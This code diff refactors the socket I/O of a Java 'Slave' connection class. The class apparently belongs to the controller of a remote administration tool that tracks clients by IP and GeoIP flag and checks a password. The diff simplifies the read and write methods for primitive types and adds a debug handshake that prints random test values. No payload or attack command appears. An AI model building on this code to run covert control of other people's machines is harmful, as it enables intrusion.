@@ -11,6 +11,7 @@ import java.io.PrintWriter;
 import java.net.Socket;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Random;
 
 import javax.swing.ImageIcon;
 
@@ -103,13 +104,13 @@ public class Slave implements Runnable {
 
 			this.ip = socket.getInetAddress().getHostAddress() + " / " + socket.getPort();
 			this.host = socket.getInetAddress().getHostName();
-			
+
 			if (Settings.getGlobal().getBoolean("geoip")) {
 				Country country = FlagUtils.getCountry(this);
-				
+
 				if (country != null) {
 					this.country = country.get2cStr();
-					
+
 					if (this.country.equalsIgnoreCase("ZZ")) {
 						this.country = "?";
 					}
@@ -130,8 +131,27 @@ public class Slave implements Runnable {
 
 			this.pw = new PrintWriter(dos, true);
 			this.br = new BufferedReader(new InputStreamReader(dis));
-			
+
 			this.outputStream.write(encryption ? 1 : 0);
+			
+			int i = (new Random()).nextInt();
+			long l = (new Random()).nextInt();
+			short s = (short) (new Random()).nextInt(1000);
+
+			
+			System.out.println("Write int: " + i);
+			System.out.println("Write long: " + l);
+			System.out.println("Write short: " + s);
+			
+			writeInt(i);
+			writeLong(l);
+			writeShort(s);
+			
+			System.out.println("Read int: " + readInt());
+			System.out.println("Read long: " + readLong());
+			System.out.println("Read short: " + readShort());
+			
+			
 
 			while (true) {
 				byte header = readByte();
@@ -143,7 +163,7 @@ public class Slave implements Runnable {
 				}
 
 				if (!isVerified()) {
-					//String pass = readLine();
+					// String pass = readLine();
 					PanelMainLog.instance.addEntry("Warning", this, "Failed verify password");
 					this.closeSocket(new CloseException("Failed verify password"));
 				}
@@ -173,93 +193,45 @@ public class Slave implements Runnable {
 		PacketBuilder builder = new PacketBuilder(header);
 		addToSendQueue(builder);
 	}
-	
-	public  void writeShort(int i) throws Exception {
-		if (true) {
-			writeLine(i);
-		} else {
-			dos.writeShort(i);
 
-		}
+	public void writeShort(short i) throws Exception {
+		dos.writeShort(i);
 	}
 
-	public  short readShort() throws Exception {
-		if (true) {
-			return Short.parseShort(readLine());
-		} else {
-			return dis.readShort();
-
-		}
+	public short readShort() throws Exception {
+		return dis.readShort();
 	}
 
-	public  byte readByte() throws Exception {
-		if (true) {
-			return Byte.parseByte(readLine());
-		} else {
-			return dis.readByte();
-
-		}
+	public byte readByte() throws Exception {
+		return dis.readByte();
 	}
 
-	public  void writeByte(int b) throws Exception {
-		if (true) {
-			writeLine(b);
-		} else {
-			dos.writeByte(b);
-
-		}
+	public void writeByte(int b) throws Exception {
+		dos.writeByte(b);
 	}
 
-	public  boolean readBoolean() throws Exception {
-		if (true) {
-			return readLine().equalsIgnoreCase("true");
-		} else {
-			return dis.readBoolean();
-
-		}
+	public boolean readBoolean() throws Exception {
+		return dis.readBoolean();
 	}
 
-	public  void writeBoolean(boolean b) throws Exception {
-		if (true) {
-			writeLine(b);
-		} else {
-			dos.writeBoolean(b);
-
-		}
+	public void writeBoolean(boolean b) throws Exception {
+		dos.writeBoolean(b);
 	}
 
-	public  int readInt() throws Exception {
-		if (true) {
-			return Integer.parseInt(readLine());
-		} else {
-			return dis.readInt();
-
-		}
+	public int readInt() throws Exception {
+		return dis.readInt();
 	}
 
-	public  void writeInt(int i) throws Exception {
-		if (true) {
-			writeLine(i);
-		} else {
-			dos.writeInt(i);
-
-		}
+	public void writeInt(int i) throws Exception {
+		dos.writeInt(i);
 	}
 
-	public  long readLong() throws Exception {
-		if (true) {
-			return Long.parseLong(readLine());
-		} else {
-			return dis.readLong();
-		}
+	public long readLong() throws Exception {
+		return dis.readLong();
 	}
 
-	public  void writeLong(long l) throws Exception {
-		if (true) {
-			writeLine(l);
-		} else {
-			dos.writeLong(l);
-		}
+	public void writeLong(long l) throws Exception {
+		dos.writeLong(l);
 	}
 
 	public synchronized void addToSendQueue(PacketBuilder packet) {
@@ -274,11 +246,10 @@ public class Slave implements Runnable {
 		packet.write(this);
 	}
 
-	
 	public void writeLine(Object obj) {
 		writeLine(obj.toString());
 	}
-	
+
 	public void writeLine(String s) {
 		try {
 			String enc = Crypto.encrypt(s, connection.getKey().getKey());
@@ -291,7 +262,7 @@ public class Slave implements Runnable {
 				enc = "-c " + s;
 			}
 
-			//dos.writeUTF(enc);
+			// dos.writeUTF(enc);
 			dos.writeShort(enc.length());
 			dos.writeChars(enc);
 		} catch (Exception ex) {
@@ -300,7 +271,7 @@ public class Slave implements Runnable {
 	}
 
 	public String readLine() throws Exception {
-		//String s = dis.readUTF();
+		// String s = dis.readUTF();
 		short len = dis.readShort();
 
 		StringBuilder builder = new StringBuilder();
